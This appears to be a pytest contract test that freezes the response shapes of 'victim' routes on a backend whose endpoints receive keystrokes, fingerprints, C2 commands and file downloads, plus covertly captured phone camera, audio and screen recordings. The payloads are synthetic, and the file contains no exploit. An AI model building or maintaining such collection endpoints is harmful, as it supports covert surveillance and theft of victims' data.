"""P1 freeze victim POST/GET routes (NR-1).

Replays every endpoint in tests/contract/victim.json with a synthetic
payload and no session cookie. Must answer 2xx with the frozen shape.
"""
from __future__ import annotations

import pytest
import requests

from ._catalog import victim_pairs
from ._helpers import compare_or_update, shape_snapshot


# Tiny valid payloads derived from audit/audit_storm_breaker.py:224 (victim_endpoints).
# These mirror what the audit harness sends; tweaking them would also tweak
# what the audit harness "expects" from the live backend.
_VICTIM_PAYLOADS: dict[str, dict] = {
    "/receiver": {"uid": "char-rx", "url": "http://char",
                  "data": [], "log": []},
    "/receiver.php": {"uid": "char-rx", "url": "http://char",
                      "data": [], "log": []},
    "/api/fingerprint": {"fingerprint": {"ua": "char"},
                          "canvas": "c", "webgl": "w",
                          "fonts": [], "timezone": "UTC"},
    "/api/keystrokes": {"logs": [{"type": "keypress",
                                  "target": {"type": "body", "tag": "BODY"}}],
                        "url": "http://char"},
    "/api/session/start": {"sessionId": "char-session", "url": "http://char"},
    "/api/session/events": {"sessionId": "char-session",
                            "events": [{"type": "click"}]},
    "/api/session/end": {"sessionId": "char-session", "duration": 1},
    "/api/c2/register": {"uid": "char-c2", "info": {"os": "linux"}},
    "/api/c2/poll": {"uid": "char-c2"},
    "/api/c2/response": {"uid": "char-c2", "output": "ok"},
    "/api/c2/file_list_response": {"uid": "char-c2", "files": []},
    "/api/c2/file_download_response": {"uid": "char-c2", "filename": "x",
                                       "data": ""},
    "/api/mobile/register": {"uid": "char-mob", "info": {"platform": "android"}},
    "/api/mobile/poll": {"uid": "char-mob"},
    "/api/mobile/response": {"uid": "char-mob", "output": "ok"},
    "/api/mobile/camera": {"uid": "char-mob",
                           "image": "data:image/jpeg;base64,/9j/AAAA"},
    "/api/mobile/background_data": {"uid": "char-mob",
                                    "data": {"type": "still"}},
    "/api/mobile/screenshot": {"uid": "char-mob",
                               "image": "data:image/jpeg;base64,/9j/AAAA",
                               "url": "http://char", "timestamp": "x"},
    "/api/mobile/audio": {"uid": "char-mob",
                          "audio": "data:audio/webm;base64,AAA",
                          "timestamp": "x"},
    "/api/mobile/screen_record": {"uid": "char-mob",
                                  "video": "data:video/webm;base64,AAA",
                                  "duration": 1, "timestamp": "x"},
    "/api/browser-exfil/receive": {"uid": "char-x",
                                   "data": {"k": "v"}},
    "/api/network/receive": {"uid": "char-x",
                             "data": {"k": "v"}},
}


@pytest.mark.parametrize("path, method", victim_pairs())
@pytest.mark.char
def test_victim_shape(live_server: str, path: str, method: str,
                      request: pytest.FixtureRequest) -> None:
    payload = _VICTIM_PAYLOADS.get(path, {})
    if method == "GET":
        resp = requests.get(f"{live_server}{path}", timeout=15)
    else:
        resp = requests.post(f"{live_server}{path}", json=payload, timeout=15)
    snap = shape_snapshot(resp)
    ok, msg = compare_or_update(
        group="victim",
        key=f"{method} {path}",
        snap=snap,
        update=request.config.getoption("--update-snapshots"),
    )
    if ok and "first run baseline" in msg:
        pytest.skip(msg)
    assert ok, msg
